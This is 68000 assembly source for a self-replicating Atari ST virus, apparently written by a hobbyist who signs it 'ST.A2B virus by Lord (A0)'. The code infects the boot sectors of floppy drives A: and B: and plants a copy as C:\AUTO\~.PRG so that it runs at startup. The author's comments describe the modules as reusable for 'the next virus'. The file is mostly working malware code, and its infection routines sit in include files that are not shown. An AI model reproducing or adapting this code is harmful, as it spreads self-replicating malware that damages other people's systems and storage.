
; NOTES ON VIRUS STRUCTURE:
; this allows me to implement strict modularization. before it was all in this file. it started crashing, i couldn't figure it out
; and it was driving me nuts. i also had to do more scrolling.

; second, i implemented stack frames and preservation of all regs (except return vals). stack frames allow me to conserve space
; by keeping all non-initialized data in the stack. register preservation allows me to not worry about registers being destroyed. thus,
; it removes one awful source of hard-to-find bugs.

; third, this can be re-usable code. simply include these files in the next virus. the subroutines themselves can even be modified
; so that a new virus definition must be made.

; this modularization was alot of work, but in the long run it's kept the headaches at bay.


	 ORG $0
_bootdev	EQU	$446

_DBGBRA macro
	bra \1
	ENDM
	
_DBGBSR macro
	bsr \1
	ENDM

; ONLY USE THIS UNDER MONST. WITHOUT A DEBUGGER, THIS'LL BOMB!!!
_INT3H	MACRO
	trap #9
	ENDM
  
;;;;;;;;;;;;;;;;;;;;;;;;;;; CODE ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
 
_entry:
 	 bra.s	_gosup
 	EVEN		
_dsk_start_bpb:
	 dcb.b	$1C,0
_dsk_end_bpb:

_gosup:
       bra.s	_main
       
       ; as a GEM program, the system's already given us all RAM. we don't need that.
       ; so we tell the system to shrink our allotment. this also enables make_buff to work.
       		
       lea.l	stckend(pc),a0
       lea.l	_yesup(pc),a1
       bra	mshrink
   
   _yesup:
       pea	setup_mainf(pc)
       move.w	#$26,-(sp)
       trap	#14
       addq.l	#6,sp
       bra	gemdos_term

_main: 	

; s_buff is for storing the victim. it's also used by infect_AUTO
; d_flg retains the pointer to DFLG. this allows us to determine whether we're .PRG
; or bootsector.

s_buff	EQU  -4
d_flg	EQU  -8

read_more_code:
	lea	_entry+$200(pc),a0	; next sector
	move.w	_bootdev,d0		; floppy drive
	move.w	#$08,d5			; floprd()
	bsr	rw_more_code

setup_mainf:
	link	a6,#-8

erase_chksum:
	lea	_entry+$1FE(pc),a0
	move.w	#$4E71,(a0)

; we need to know if we are starting from a .PRG or bootsector
; everytime the .PRG is made, the DFLG is set to -1. From the bootsector
; it's zero.
; when the .PRG runs, the DFLG gets cleared before infecting A: & B:.

check_bootloc:
	bsr	check_bootflg
	exg.l	d1,a0
	move.l	a0,d_flg(a6)
	cmpi.l	#-1,(a0)	
	beq	infect_BOTH
	tst.w	d0
	bne	infect_B


; at this point, we are booting from B therefore we simply infect the AUTO
; folder and quit. ~.PRG would then infect both disks. we also have to retrieve the
; rest of the virus.

	do_AUTO:
		move.l	d_flg(a6),a0
		move.l	#-1,(a0)
		
		lea.l	_gosup(pc),a0
		move.w	(a0),a2
		move.w	#$4E71,(a0)
		
		lea.l	_entry(pc),a0
		lea.l	fname(pc),a1
		move.l	#(ABSVIRLEN),d0
		bsr	infect_AUTO

		lea.l	_gosup(pc),a0
		move.w	a2,(a0)
		
		bra	exit

G2M EQU (_main-_gosup-2)	
	
	infect_B:	
;; put bra.s back
		lea	_gosup(pc),a0
		move.b	#$60,(a0)+
		move.b	#G2M,(a0)+
	
;; for the victim
		move.l	#$200*2,d0
		bsr	make_buff
		move.l	d0,s_buff(a6)
		exg.l	d0,a0

;; infect B: bootsector
		move.l	s_buff(a6),a0	
		moveq	#1,d0
		lea	_gosup(pc),a2
		bsr 	infect_BOOT

;; free victim buffer	
	      ; a0 = *(s_buff)
		bsr	free_buff
		bra.s	do_AUTO

	infect_BOTH:

;; put bra.s back	
		lea	_gosup(pc),a0
		move.b	#$60,(a0)+
		move.b	#G2M,(a0)+

;; will be started from floppy
		move.l	d_flg(a6),a0
		clr.l	(a0)
		
		move.l	#$200*2,d0
		bsr	make_buff
		move.l	d0,s_buff(a6)		
		exg.l	d0,a0
		lea.l	_gosup(pc),a2
		clr.l	d0
		bsr	infect_BOOT ; hit A
		addq	#1,d0
		bsr	infect_BOOT ; hit B
		bsr	free_buff	
		unlk	a6
		rts

	gemdos_term:
		clr.l	-(a7) ; pterm()
		trap	#1
		
exit:
      unlk	a6
      rts

	include boot.inc
	include mem.inc
	include fileio.inc


	EVEN
;.DATA       

; file io
	fname:	dc.b	"C:\AUTO\~.PRG",0
	info:	dc.b	"ST.A2B virus by Lord (A0), (C) 2009",0
; 0 = boot
; 1 = PRG

   ; stack
stkstart:    ds.l 256
stckend:     ds.l 1   

END:
VIRLEN	  EQU	(END-_gosup)
ABSVIRLEN EQU	(END-_entry)